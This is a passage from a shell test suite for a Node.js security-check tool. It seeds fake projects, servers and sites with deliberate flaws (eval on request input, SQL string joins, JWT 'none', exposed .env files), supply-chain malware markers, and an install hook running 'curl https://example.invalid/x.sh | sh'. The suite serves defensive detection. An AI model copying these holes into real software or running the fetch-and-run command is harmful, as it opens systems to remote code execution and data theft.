proj c-nogit; put p/c-nogit/src/config.js "const key = '${AK}';"; put p/c-nogit/.env "AWS=${AK}"
put p/c-nogit/node_modules/dep/index.js "const key = '${AK}'; eval(x);"; put p/c-nogit/dist/bundle.js "const key = '${AK}';"
t "no git: project files are scanned"        2 "AWS access key ID: 1 line in the project files" ""                  --only code p/c-nogit
t "no git: .env, node_modules, dist skipped" 2 "src/config.js:1" "node_modules/dep"                                 --only code p/c-nogit
proj c-public; put p/c-public/public/.env 'A=1'
t ".env inside public/ is a problem"         2 "public/ contains a .env file" ""                                    --only code p/c-public

group "Code: risky patterns"
proj c-risky
put p/c-risky/src/eval.js 'const out = eval(req.body.code);'
put p/c-risky/src/fn.ts 'const f = new Function("a", body);'
put p/c-risky/src/shell.js 'const { exec } = require("child_process");
exec(`convert ${req.query.file} out.png`);'
put p/c-risky/src/tls.js 'const agent = new https.Agent({ rejectUnauthorized: false });'
put p/c-risky/src/view.jsx 'export default () => <div dangerouslySetInnerHTML={{ __html: html }} />;'
put p/c-risky/src/sql.js 'db.query("SELECT * FROM users WHERE id = " + req.params.id);'
put p/c-risky/src/file.js 'res.sendFile(req.query.path);'
put p/c-risky/src/token.js 'const token = Math.random().toString(36);'
put p/c-risky/src/hash.js 'const h = crypto.createHash("md5").update(pw).digest("hex");'
put p/c-risky/src/cors.js 'app.use(cors({ origin: "*", credentials: true }));'
put p/c-risky/src/jwt.js 'jwt.verify(t, key, { algorithms: ["HS256", "none"] });'
gitify c-risky
t "eval and new Function"                    0 "eval() or new Function(): 2 lines" ""                               --only code p/c-risky
t "shell command built from variables"       0 "Shell command built from variables: 1 line" ""                      --only code p/c-risky
t "TLS checks turned off"                    0 "TLS certificate checks turned off: 1 line" ""                       --only code p/c-risky
t "HTML inserted without escaping"           0 "HTML inserted without escaping: 1 line" ""                          --only code p/c-risky
t "SQL built by joining strings"             0 "SQL built by joining strings: 1 line" ""                            --only code p/c-risky
t "file path from the request"               0 "File path or redirect taken straight from the request: 1 line" ""   --only code p/c-risky
t "Math.random for a token"                  0 "Math.random() near a token" ""                                      --only code p/c-risky
t "MD5 hashing"                              0 "MD5 or SHA-1 hashing: 1 line" ""                                    --only code p/c-risky
t "CORS open to every site"                  0 "CORS open to every site: 1 line" ""                                 --only code p/c-risky
t "JWT 'none' algorithm"                     0 "JWT checks weakened: 1 line" ""                                     --only code p/c-risky
t "regex .exec() is not a shell command"     0 "" "Shell command"                                                   --only code p/c-clean
t "warnings alone still pass"                0 "RESULT: PASS, with" ""                                              --only code p/c-risky
t "--fail-on-warn makes them fail"           2 "--fail-on-warn is set" ""                                           --only code --fail-on-warn p/c-risky

group "Code: framework, Docker and CI files"
mkdir -p p/c-express; put p/c-express/package.json '{ "name": "x", "dependencies": { "express": "^4.19.0" } }'
mkdir -p p/c-helmet; put p/c-helmet/package.json '{ "name": "x", "dependencies": { "express": "^4.19.0", "helmet": "^7.0.0", "express-rate-limit": "^7.0.0" } }'
mkdir -p p/c-vm2; put p/c-vm2/package.json '{ "name": "x", "dependencies": { "vm2": "^3.9.0" } }'
t "Express without helmet warns"             0 "Express/NestJS without helmet" ""                                   --only code p/c-express
t "Express with helmet and rate limiter"     0 "helmet is installed" "without helmet"                               --only code p/c-helmet
t "unmaintained risky package (vm2)"         0 "uses 'vm2'" ""                                                      --only code p/c-vm2

proj d-bad; put p/d-bad/Dockerfile 'FROM node:latest
WORKDIR /app
COPY . .
COPY .env /app/.env
ENV API_TOKEN=abc
RUN npm install
CMD ["node", "server.js"]'
proj d-good; put p/d-good/Dockerfile 'FROM node:22.11-slim AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
FROM build AS runtime
USER node
CMD ["node", "server.js"]'; put p/d-good/.dockerignore '.env
.git
node_modules'
t "Dockerfile: no USER line"                 2 "no USER line" ""                                                    --only code p/d-bad
t "Dockerfile: latest tag"                   2 "uses the 'latest' tag" ""                                           --only code p/d-bad
t "Dockerfile: copies .env"                  2 "copies a .env file into the image" ""                               --only code p/d-bad
t "Dockerfile: secret in ENV"                2 "secret-looking ENV or ARG" ""                                       --only code p/d-bad
t "Dockerfile: no .dockerignore"             2 "there is no .dockerignore" ""                                       --only code p/d-bad
t "Dockerfile: good one passes"              0 "runs as a non-root user (node)" "[WARN]"                            --only code p/d-good
proj d-compose; put p/d-compose/docker-compose.yml 'services:
  web:
    image: node:22
    privileged: true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
  db:
    image: postgres:16
    ports:
      - "5432:5432"'
proj d-compose-ok; put p/d-compose-ok/compose.yaml 'services:
  db:
    image: postgres:16
    ports:
      - "127.0.0.1:5432:5432"'
t "compose: privileged service"              2 "privileged: true" ""                                                --only code p/d-compose
t "compose: Docker socket mounted"           2 "mounts the Docker socket" ""                                        --only code p/d-compose
t "compose: database port published"         2 "a database port is published" ""                                    --only code p/d-compose
t "compose: port bound to localhost is fine" 0 "RESULT: PASS." "database port"                                      --only code p/d-compose-ok

proj w-bad; put p/w-bad/.github/workflows/ci.yml 'on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: some-org/some-action@main
      - uses: ./local-action'
proj w-good; put p/w-good/.github/workflows/ci.yml 'on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2'
t "workflow: actions pinned to tags"         0 "2 action reference(s) use a tag or branch" ""                       --only code p/w-bad
t "workflow: pull_request_target"            0 "uses pull_request_target" ""                                        --only code p/w-bad
t "workflow: pinned to commit hash"          0 "Every action is pinned to a full commit hash" "[WARN]"              --only code p/w-good

# ============================================================== SERVER ====
group "Server: processes, ports, firewall, SSH, updates"

# A badly set-up server.
fakeid srv-bad 0
fakeout srv-bad ps 0 'root         812 node --inspect=0.0.0.0:9229 /srv/app/server.js
root         400 nginx: master process /usr/sbin/nginx
www-data     401 nginx: worker process
root         300 PM2 v5.4.2: God Daemon (/root/.pm2)'
fakeout srv-bad ss 0 'LISTEN 0 511 0.0.0.0:3000 0.0.0.0:* users:(("node",pid=812,fd=18))
LISTEN 0 511 0.0.0.0:6379 0.0.0.0:* users:(("redis-server",pid=500,fd=6))
LISTEN 0 511 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=400,fd=6))
LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=100,fd=3))'
fakeout srv-bad ufw 0 'Status: inactive'
fakeout srv-bad apt-get 0 'Inst libssl3 [3.0.2-0ubuntu1.18] (3.0.2-0ubuntu1.20 Ubuntu:22.04/jammy-security [amd64])
Inst openssl [3.0.2-0ubuntu1.18] (3.0.2-0ubuntu1.20 Ubuntu:22.04/jammy-security [amd64])
Inst vim [2:8.2] (2:8.3 Ubuntu:22.04/jammy-updates [amd64])'
fake srv-bad dpkg 'exit 1'
fake srv-bad systemctl 'case "$2" in
  app-root) printf "LoadState=loaded\nUser=\nNoNewPrivileges=no\nProtectSystem=no\nPrivateTmp=no\nProtectHome=no\n" ;;
  app-good) printf "LoadState=loaded\nUser=app\nNoNewPrivileges=yes\nProtectSystem=full\nPrivateTmp=yes\nProtectHome=read-only\n" ;;
  app-plain) printf "LoadState=loaded\nUser=app\nNoNewPrivileges=no\nProtectSystem=no\nPrivateTmp=no\nProtectHome=no\n" ;;
  *) printf "LoadState=not-found\n" ;;
esac'
put sys-bad/etc/ssh/sshd_config '# comment
PermitRootLogin yes
PasswordAuthentication yes'
mkdir -p sys-bad/var/run; touch sys-bad/var/run/reboot-required
put sys-bad/etc/nginx/nginx.conf 'http {
  # server_tokens off;
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
  autoindex on;
}'

# A well set-up server.
fakeid srv-good 0
fakeout srv-good ps 0 'app          812 /usr/bin/node /srv/app/server.js
root         400 nginx: master process /usr/sbin/nginx
app          300 PM2 v5.4.2: God Daemon (/home/app/.pm2)'
fakeout srv-good ss 0 'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=812,fd=18))
LISTEN 0 511 127.0.0.1:6379 0.0.0.0:* users:(("redis-server",pid=500,fd=6))
LISTEN 0 511 [::1]:5432 [::]:* users:(("postgres",pid=501,fd=6))
LISTEN 0 511 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=400,fd=6))
LISTEN 0 511 [::]:80 [::]:* users:(("nginx",pid=400,fd=7))'
fakeout srv-good ufw 0 'Status: active'
fakeout srv-good apt-get 0 'Reading package lists...'
fake srv-good dpkg 'exit 0'
fake srv-good fail2ban-client 'exit 0'
cp bin/srv-bad/systemctl bin/srv-good/systemctl
put sys-good/etc/ssh/sshd_config.d/50-hardening.conf 'PasswordAuthentication no'
put sys-good/etc/ssh/sshd_config 'Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin prohibit-password
PasswordAuthentication yes'
put sys-good/etc/nginx/nginx.conf 'http {
  server_tokens off;
  ssl_protocols TLSv1.2 TLSv1.3;
}'

proj s-app; put p/s-app/.env 'A=1'; chmod 644 p/s-app/.env; put p/s-app/upload.js 'x'; chmod 666 p/s-app/upload.js
proj s-app-ok; put p/s-app-ok/.env 'A=1'; chmod 600 p/s-app-ok/.env

SRV="--only server --server vps --proxy nginx"
BINS="srv-bad"; SYSROOT="$T/sys-bad"
# shellcheck disable=SC2086
{
t "Node running as root"                     2 "Node process running as root (PID 812)" ""                          $SRV --runner other p/s-app
t "debugger open to the network"             2 "Node debugger open to the network" ""                               $SRV --runner other p/s-app
t "Node reachable past the proxy"            2 "Node listens on every network interface (port 3000)" ""             $SRV --runner other p/s-app
t "Redis on a public interface"              2 "Port 6379 (Redis) listens on every network interface" ""            $SRV --runner other p/s-app
t "firewall switched off"                    2 "ufw is installed but switched off" ""                               $SRV --runner other p/s-app
t "SSH root login with password"             2 "PermitRootLogin yes" ""                                             $SRV --runner other p/s-app
t "SSH accepts passwords"                    2 "PasswordAuthentication yes" ""                                      $SRV --runner other p/s-app
t "security updates waiting"                 2 "2 security update(s) waiting" ""                                    $SRV --runner other p/s-app
t "restart needed"                           2 "needs a restart" ""                                                 $SRV --runner other p/s-app
t ".env readable by everyone"                2 ".env file(s) readable by every user" ""                             $SRV --runner other p/s-app
t "world-writable project file"              2 "any user on this machine can change" ""                             $SRV --runner other p/s-app
t "nginx: old TLS versions"                  2 "nginx still accepts old TLS versions" ""                            $SRV --runner other p/s-app
t "nginx: version shown, autoindex on"       2 "autoindex on" ""                                                    $SRV --runner other p/s-app
t "systemd service running as root"          2 "Service app-root runs as root" ""                                   $SRV --runner systemd --service app-root p/s-app
t "systemd service not found"                2 "no loaded service called 'nope'" ""                                 $SRV --runner systemd --service nope p/s-app
t "PM2 running as root"                      2 "PM2 runs as root" ""                                                $SRV --runner pm2 p/s-app
}
BINS="srv-good"; SYSROOT="$T/sys-good"
# shellcheck disable=SC2086
{
t "good server passes"                       0 "RESULT: PASS." "[WARN]"                                             $SRV --runner systemd --service app-good p/s-app-ok
t "good server: nothing high or unknown"     0 "Checks that didn't run  : 0" "[HIGH]"                               $SRV --runner systemd --service app-good p/s-app-ok
t "good server: Node not as root"            0 "No Node process runs as root" ""                                    $SRV --runner systemd --service app-good p/s-app-ok
t "good server: Node on localhost only"      0 "Node doesn't listen on a public interface" ""                       $SRV --runner systemd --service app-good p/s-app-ok
t "good server: firewall on"                 0 "ufw is active" ""                                                   $SRV --runner systemd --service app-good p/s-app-ok
t "good server: sshd_config.d wins"          0 "SSH password sign-in is off" ""                                     $SRV --runner systemd --service app-good p/s-app-ok
t "good server: service hardened"            0 "has the basic systemd hardening options set" ""                     $SRV --runner systemd --service app-good p/s-app-ok
t "service without hardening gets a note"    0 "Optional hardening not set for app-plain" ""                        $SRV --runner systemd --service app-plain p/s-app-ok
t "PM2 as its own user"                      0 "PM2 does not run as root" ""                                        $SRV --runner pm2 p/s-app-ok
t "server-only run needs no project"         0 "RESULT: PASS" ""                                                    $SRV --runner other "$T/tmp"
}

# Not root: some checks can't run.
mkdir -p bin/srv-user; cp bin/srv-good/ps bin/srv-good/apt-get bin/srv-good/dpkg bin/srv-user/
fakeid srv-user 1000
fakeout srv-user ss 0 'LISTEN 0 511 0.0.0.0:3000 0.0.0.0:*
LISTEN 0 511 127.0.0.1:6379 0.0.0.0:*'
fake srv-user ufw 'exit 1'
put sys-user/etc/ufw/ufw.conf 'ENABLED=yes'
put sys-user/etc/ssh/sshd_config 'PasswordAuthentication no'
BINS="srv-user"; SYSROOT="$T/sys-user"
# shellcheck disable=SC2086
{
t "not root: says so"                        0 "Not running as root" ""                                             $SRV --runner other p/s-app-ok
t "not root: ufw read from its config file"  0 "ufw is enabled (from its config file)" ""                           $SRV --runner other p/s-app-ok
t "not root: can't tell how Node listens"    0 "can't see which program owns each port" ""                          $SRV --runner other p/s-app-ok
}
SYSROOT=""; BINS=""

group "Server: Apache, Caddy, Docker"
fakeid srv-min 0
fakeout srv-min ps 0 'app          812 node /srv/app/server.js'
fakeout srv-min ss 0 'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=812,fd=18))'
fakeout srv-min ufw 0 'Status: active'
put sys-apache/etc/apache2/apache2.conf 'ServerTokens OS
SSLProtocol all -SSLv3
Options Indexes FollowSymLinks'
put sys-apache/etc/apache2/mods-enabled/ssl.conf 'SSLProtocol +TLSv1 +TLSv1.2'
put sys-apache-ok/etc/httpd/conf/httpd.conf 'ServerTokens Prod
SSLProtocol -all +TLSv1.2 +TLSv1.3'
put sys-caddy/etc/caddy/Caddyfile '{
  auto_https off
}'
BINS="srv-min"
SYSROOT="$T/sys-apache";    t "Apache: old TLS and version shown" 0 "Apache still accepts old TLS versions" "" --only server --server vps --proxy apache --runner other "$T/tmp"
SYSROOT="$T/sys-apache-ok"; t "Apache: good settings"             0 "Apache hides its version number" "old TLS" --only server --server vps --proxy apache --runner other "$T/tmp"
SYSROOT="$T/sys-caddy";     t "Caddy: automatic HTTPS turned off" 0 "turns off automatic HTTPS" ""             --only server --server vps --proxy caddy --runner other "$T/tmp"
SYSROOT="$T/sys-none";      t "no proxy: says so"                 0 "Nothing in front of Node" ""              --only server --server vps --proxy none --runner other "$T/tmp"
t "nginx settings unreadable"                0 "Couldn't read the nginx settings" ""                                --only server --server vps --proxy nginx --runner other "$T/tmp"
SYSROOT=""

cp bin/srv-min/id bin/srv-min/ps bin/srv-min/ss bin/srv-min/ufw out/ 2>/dev/null
mkdir -p bin/dock; cp bin/srv-min/id bin/srv-min/ss bin/srv-min/ufw bin/dock/
fakeout dock ps 0 'root         812 node /app/server.js'
fake dock docker 'case "$1" in
  ps) echo "web|node:22|\"docker-entrypoint.s...\""; echo "db|postgres:16|\"postgres\"" ;;
  image) echo "2025-01-01T08:00:00.000000000Z" ;;
  inspect) case "$3" in
      *Config.Env*) if [ "$4" = web ]; then printf "NODE_ENV=production\nDB_PASSWORD=x\nAPI_TOKEN=y\nPATH=/usr/bin\n"; fi ;;
      *Config.User*) case "$4" in
          web)  echo "|true|false|/var/run/docker.sock /srv/data |host|[SYS_ADMIN]|0|node:22" ;;
          good) echo "node|false|true|/srv/data |bridge|[]|536870912|node:22-slim" ;;
          *) exit 1 ;;
        esac ;;
      *) echo "node:22" ;;
    esac ;;
  port) case "$2" in web) echo "3000/tcp -> 0.0.0.0:3000" ;; good) echo "3000/tcp -> 127.0.0.1:3000" ;; esac ;;
esac'
BINS="dock"; SYSROOT="$T/sys-none"
DOCK="--only server --server docker --proxy nginx"
# shellcheck disable=SC2086
{
t "Docker: Node containers found by name"    2 "Container web runs the app as root" "Container db"                  $DOCK "$T/tmp"
t "Docker: privileged container"             2 "Container web is privileged" ""                                     $DOCK "$T/tmp"
t "Docker: socket mounted"                   2 "Container web has the Docker socket mounted" ""                     $DOCK "$T/tmp"
t "Docker: host network and extra rights"    2 "extra kernel permissions" ""                                        $DOCK "$T/tmp"
t "Docker: port published to everyone"       2 "publishes port(s) on every network interface" ""                    $DOCK "$T/tmp"
t "Docker: root inside is a warning here"    2 "[WARN] Node process running as root" ""                             $DOCK "$T/tmp"
t "Docker: well set-up container"            0 "Container good runs as user 'node'" "[HIGH]"                        $DOCK --container good "$T/tmp"
t "Docker: unknown container name"           0 "Couldn't inspect the container 'nope'" ""                           $DOCK --container nope "$T/tmp"
}
BINS="srv-min"
t "Docker not installed"                     0 "docker not found on this machine" ""                                --only server --server docker --proxy nginx "$T/tmp"
SYSROOT=""; BINS=""

group "Server: live site checks"
mkdir -p bin/curl; cp bin/fakecurl bin/curl/curl

mkdir -p web-good web-bad web-spa web-cert web-down
printf 'HTTP/2 200\r\nstrict-transport-security: max-age=31536000\r\nX-Content-Type-Options: nosniff\r\nContent-Security-Policy: default-src '"'"'self'"'"'; frame-ancestors '"'"'none'"'"'\r\nReferrer-Policy: strict-origin-when-cross-origin\r\nSet-Cookie: sid=SECRETVALUE; Path=/; HttpOnly; Secure; SameSite=Lax\r\nServer: nginx\r\n\r\n' > web-good/root.hdr
printf 'HTTP/1.1 301 Moved Permanently\r\nLocation: https://example.test/\r\n\r\n' > web-good/http.hdr

printf 'HTTP/1.1 200 OK\r\nX-Powered-By: Express\r\nServer: nginx/1.18.0\r\nSet-Cookie: sid=SECRETVALUE; Path=/\r\n\r\n' > web-bad/root.hdr
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n' > web-bad/http.hdr
printf 'HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n' > web-bad/_env.hdr
printf 'DATABASE_URL=postgres://x\nSECRET_KEY=topsecretvalue\n' > web-bad/_env.body
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n' > web-bad/_git_HEAD.hdr
printf 'ref: refs/heads/main\n' > web-bad/_git_HEAD.body
touch web-bad/oldtls

# A single-page app answers every address with its HTML page: not a leak.
cp web-good/root.hdr web-spa/root.hdr; cp web-good/http.hdr web-spa/http.hdr
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n\r\n' > web-spa/_env.hdr
printf '<!doctype html><html><body>app</body></html>\n' > web-spa/_env.body
cp web-spa/_env.hdr web-spa/_git_HEAD.hdr; cp web-spa/_env.body web-spa/_git_HEAD.body
echo 60 > web-cert/exit
echo 6 > web-down/exit

BINS="curl"
WEB="--only server --server managed --url https://example.test"
# shellcheck disable=SC2086
{
ENVS="CURL_FIX=$T/web-good"
t "good site passes"                         0 "RESULT: PASS." "[WARN]"                                             $WEB "$T/tmp"
t "good site: cookie flags recognised"       0 "Cookie 'sid' has HttpOnly, SameSite and Secure" "SECRETVALUE"       $WEB "$T/tmp"
t "good site: http redirects to https"       0 "Plain http:// redirects to https://" ""                             $WEB "$T/tmp"
ENVS="CURL_FIX=$T/web-bad"
t "bad site: /.env is public"                2 "/.env is public" "topsecretvalue"                                   $WEB "$T/tmp"
t "bad site: /.git is public"                2 "/.git/ is public" ""                                                $WEB "$T/tmp"
t "bad site: no HSTS"                        2 "No Strict-Transport-Security header" ""                             $WEB "$T/tmp"
t "bad site: no CSP"                         2 "No Content-Security-Policy header" ""                               $WEB "$T/tmp"
t "bad site: can be framed"                  2 "clickjacking" ""                                                    $WEB "$T/tmp"
t "bad site: X-Powered-By shown"             2 "X-Powered-By: Express" ""                                           $WEB "$T/tmp"
t "bad site: server version shown"           2 "Server header shows a version number: nginx/1.18.0" ""              $WEB "$T/tmp"
t "bad site: cookie flags missing"           2 "Cookie 'sid' is missing: HttpOnly SameSite Secure" "SECRETVALUE"    $WEB "$T/tmp"
t "bad site: http doesn't redirect"          2 "without redirecting to https://" ""                                 $WEB "$T/tmp"
t "bad site: old TLS accepted"               2 "accepts TLS 1.0 or 1.1" ""                                          $WEB "$T/tmp"
ENVS="CURL_FIX=$T/web-spa"
t "single-page app fallback is not a leak"   0 "/.env is not served" "is public"                                    $WEB "$T/tmp"
ENVS="CURL_FIX=$T/web-cert"
t "untrusted certificate"                    2 "certificate is not trusted" ""                                      $WEB "$T/tmp"
ENVS="CURL_FIX=$T/web-down"
t "site unreachable: reported, not a pass"   0 "Couldn't reach https://example.test" ""                             $WEB "$T/tmp"
t "site unreachable with --strict"           3 "RESULT: NOT COMPLETE" ""                                            $WEB --strict "$T/tmp"
ENVS="CURL_FIX=$T/web-good"
t "--no-network skips the live site"         0 "Skipped (--no-network)" ""                                          $WEB --no-network "$T/tmp"
t "plain http address warns"                 0 "The address is plain http://" ""                                    --only server --server managed --url http://example.test "$T/tmp"
}
BINS=""; ENVS=""
t "curl not installed"                       0 "curl is not installed" ""                                           --only server --server managed --url https://example.test "$T/tmp"
t "development machine: checks skipped"      0 "this is a development machine" ""                                   --only server --server dev "$T/tmp"
t "hosting platform: checks skipped"         0 "the hosting platform looks after the machine" ""                    --only server --server managed "$T/tmp"
t "--url must be http(s)"                    3 "must start with http:// or https://" ""                                           --only server --url ftp://example.test "$T/tmp"
t "--service with odd characters refused"    3 "may only contain" ""                                                --only server --service 'a;b' "$T/tmp"

# =============================================== OPTIONS AND SETUP MENU ====
group "Options, errors and the setup questions"
BINS="ok"
t "--help"                                   0 "Usage: ./node-security-check.sh" ""                                 --help
t "--version"                                0 "node-security-check.sh 2." ""                                       --version
t "unknown option"                           3 "unknown option '--nope'" ""                                         --nope p/clean
t "missing project folder"                   3 "project folder not found" ""                                        p/does-not-exist
t "folder without package.json"              3 "package.json not found" ""                                          "$T/tmp"
t "bad --fail-on value"                      3 "FAIL_ON must be" ""                                                 --fail-on extreme p/clean
ENVS="FAIL_ON=extreme"
t "bad FAIL_ON value"                        3 "FAIL_ON must be" ""                                                 p/clean
ENVS=""
t "bad --pm value"                           3 "--pm must be" ""                                                    --pm composer p/clean
t "bad --only value"                         3 "unknown part 'everything'" ""                                       --only everything p/clean
t "everything skipped"                       3 "nothing to check" ""                                                --skip packages,code,server p/clean
t "option=value form"                        0 "Package manager  : bun" ""                                          --only=packages --pm=bun p/clean
t "--skip server"                            0 "Checking         : packages, code" "Part 3 of 3"                    --skip server --pm bun p/clean
t "all three parts by default"               0 "Part 3 of 3: server" ""                                             --pm bun --server dev p/clean
t "no questions when not in a terminal"      0 "RESULT: PASS" "Type a number"                                       --only packages --pm bun p/clean
t "--report saves a plain copy"              0 "Report saved to" ""                                                 --only packages --pm bun --report "$T/report.txt" p/clean
if grep -q "RESULT: PASS" "$T/report.txt" 2>/dev/null && ! grep -q "$(printf '\033')" "$T/report.txt"; then
  PASS=$((PASS + 1)); echo "ok    report file has the result and no colour codes"
else
  FAIL=$((FAIL + 1)); echo "FAIL  report file has the result and no colour codes"
fi

INPUT=$'3\n\n2\nn\n\n'
t "menu: packages only, pnpm"                0 "Package manager  : pnpm" "Part 2 of 3"                              --interactive p/a-pnpm
INPUT=$'5\n3\n1\n2\n1\nmyapp\n\nn\nn\n'
t "menu: server answers are used"            3 "In front of Node : apache" ""                                       --interactive p/clean
t "menu: service name is used"               3 "Kept running by  : systemd (service: myapp)" ""                     --interactive p/clean
t "menu: thoroughness answer is used"        3 "Thoroughness     : deep" ""                                         --interactive p/clean
t "menu: answering n cancels"                3 "Cancelled. Nothing was checked." "Part 3 of 3"                      --interactive p/clean
INPUT=$'9\nabc\n4\n1\nn\n\n'
t "menu: wrong answers are asked again"      0 "Please type a number from 1 to 5" ""                                --interactive p/clean
t "menu: then code only runs"                0 "Part 2 of 3" "Part 1 of 3"                                          --interactive p/clean
if [[ -e p/clean/.nsc.conf || -e p/a-pnpm/.nsc.conf ]]; then FAIL=$((FAIL + 1)); echo "FAIL  answering n to 'save' writes nothing"; else PASS=$((PASS + 1)); echo "ok    answering n to 'save' writes nothing"; fi
proj menu-all; cp p/clean/bun.lock p/menu-all/
INPUT=""
t "menu: Enter accepts every suggestion"     0 "Checking         : packages, code, server" ""                       --interactive p/menu-all
if grep -q '^pm = bun$' p/menu-all/.nsc.conf 2>/dev/null; then PASS=$((PASS + 1)); echo "ok    menu: answers are saved when asked"; else FAIL=$((FAIL + 1)); echo "FAIL  menu: answers are saved when asked"; fi
t "menu: saved answers aren't asked again"   0 "Using saved answers from" "Which package manager"                   --interactive p/menu-all
INPUT=$'\n'
t "menu: options already given aren't asked" 0 "" "Which package manager"                                           --interactive --pm bun --server dev --only packages --quick p/clean
INPUT=$'ftp://example.test\n'
t "menu: bad address is refused"             3 "must start with http:// or https://" ""                             --interactive --only server --server managed --quick "$T/tmp"
INPUT=""

# ============================================ VERSION 2 ADDITIONS =========
group "Built-in incidents beyond TanStack"
BINS="ok"; ENVS=""; SYSROOT=""; HOME_DIR="home-clean"
bunlock i-axios  '"axios": ["axios@1.14.1", "", {}, "sha512-x"],'
bunlock i-axios2 '"axios": ["axios@1.14.0", "", {}, "sha512-x"],'
bunlock i-chalk  '"chalk": ["chalk@5.6.1", "", {}, "sha512-x"],
"debug": ["debug@4.4.1", "", {}, "sha512-y"],'
bunlock i-nx     '"nx": ["nx@21.5.0", "", {}, "sha512-x"],
"@nx/key": ["@nx/key@3.2.0", "", {}, "sha512-y"],'
bunlock i-plain  '"plain-crypto-js": ["plain-crypto-js@4.2.0", "", {}, "sha512-x"],'
t "axios 1.14.1"                             1 "axios@1.14.1  (source: axios 2026-03)" ""                           --only packages --pm bun p/i-axios
t "axios 1.14.0 is fine"                     0 "RESULT: PASS" "[ALERT]"                                             --only packages --pm bun p/i-axios2
t "chalk 5.6.1, and debug 4.4.1 is fine"     1 "chalk@5.6.1  (source: chalk/debug 2025-09)" "debug@"                --only packages --pm bun p/i-chalk
t "nx 21.5.0"                                1 "nx@21.5.0  (source: Nx 2025-08" ""                                  --only packages --pm bun p/i-nx
t "@nx/key 3.2.0"                            1 "@nx/key@3.2.0" ""                                                   --only packages --pm bun p/i-nx
t "plain-crypto-js at any version (marker)"  1 "Malware marker 'plain-crypto-js'" ""                                --only packages --pm bun p/i-plain
put iocs2.txt 'some-other-package 9.9.9'
bunlock i-two '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],
"some-other-package": ["some-other-package@9.9.9", "", {}, "sha512-y"],'
t "--ioc-file given twice"                   1 "some-other-package@9.9.9" ""                                        --only packages --pm bun --ioc-file iocs.txt --ioc-file iocs2.txt p/i-two
bunlock i-worm '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/i-worm/.github/workflows/shai-hulud-workflow.yml 'name: x'
bunlock i-worm2 '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/i-worm2/.github/workflows/discussion.yaml 'name: x'
t "Shai-Hulud workflow file"                 1 "shai-hulud-workflow.yml" ""                                         --only packages --pm bun p/i-worm
t "discussion.yaml workflow warns"           0 "discussion.yaml exists" ""                                          --only packages --pm bun p/i-worm2

group "Installed packages (node_modules)"
nmproj() { bunlock "$1" '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; }
nmproj nm-clean; put p/nm-clean/node_modules/left-pad/package.json '{
  "name": "left-pad",
  "version": "1.3.0"
}'
# The lockfile is clean but a bad version is on disk.
nmproj nm-bad; put p/nm-bad/node_modules/chalk/package.json '{"name":"chalk","version":"5.6.1","main":"index.js"}'
put p/nm-bad/node_modules/chalk/test/fixture/package.json '{ "name": "debug", "version": "4.4.2" }'
nmproj nm-pnpm; put "p/nm-pnpm/node_modules/.pnpm/@tanstack+history@1.161.9/node_modules/@tanstack/history/package.json" '{
  "name": "@tanstack/history",
  "version": "1.161.9"
}'
nmproj nm-worm; put p/nm-worm/node_modules/some-pkg/package.json '{ "name": "some-pkg", "version": "1.0.0", "scripts": { "preinstall": "node setup_bun.js" } }'
put p/nm-worm/node_modules/some-pkg/setup_bun.js '// x'; put p/nm-worm/node_modules/some-pkg/bun_environment.js '// x'
nmproj nm-scripts; put p/nm-scripts/node_modules/esbuild/package.json '{
  "name": "esbuild",
  "version": "0.20.0",
  "scripts": {
    "postinstall": "node install.js"
  }
}'
put p/nm-scripts/node_modules/dodgy/package.json '{
  "name": "dodgy",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/x.sh | sh"
  }
}'
t "clean node_modules"                       0 "None of the 1 installed package versions is on the known-bad list" "" --only packages --pm bun p/nm-clean
t "bad version on disk, clean lockfile"      1 "INSTALLED in node_modules: chalk@5.6.1" ""                          --only packages --pm bun p/nm-bad
t "nested fixture files are not packages"    1 "" "debug@4.4.2"                                                     --only packages --pm bun p/nm-bad
t "pnpm's nested node_modules layout"        1 "INSTALLED in node_modules: @tanstack/history@1.161.9" ""            --only packages --pm bun p/nm-pnpm
t "Shai-Hulud payload files on disk"         1 "Malware payload file(s) inside node_modules" ""                     --only packages --pm bun p/nm-worm
t "install scripts are listed"               0 "2 installed package(s) run a script when installed" ""              --only packages --pm bun p/nm-scripts
t "downloading install script warns"         0 "install script downloads or decodes something" ""                   --only packages --pm bun p/nm-scripts
t "the downloading package is named"         0 "node_modules/dodgy" ""                                              --only packages --pm bun p/nm-scripts
t "no node_modules: says so"                 0 "No node_modules folder here" ""                                     --only packages --pm bun p/clean
t "--quick skips the node_modules scan"      0 "RESULT: PASS" "INSTALLED in node_modules"                           --only packages --pm bun --quick p/nm-bad

group "OSV malicious-package lookup"
mkdir -p osv-mal osv-vuln osv-fail; echo "evil-pkg" > osv-mal/osv-mal; touch osv-vuln/osv-vuln osv-fail/osv-fail
bunlock osv '"evil-pkg": ["evil-pkg@1.0.0", "", {}, "sha512-x"],
"left-pad": ["left-pad@1.3.0", "", {}, "sha512-y"],'
t "OSV: nothing malicious"                   0 "OSV lists none of the 2 package versions as malicious" ""           --only packages --pm bun p/osv
ENVS="CURL_FIX=$T/osv-mal"
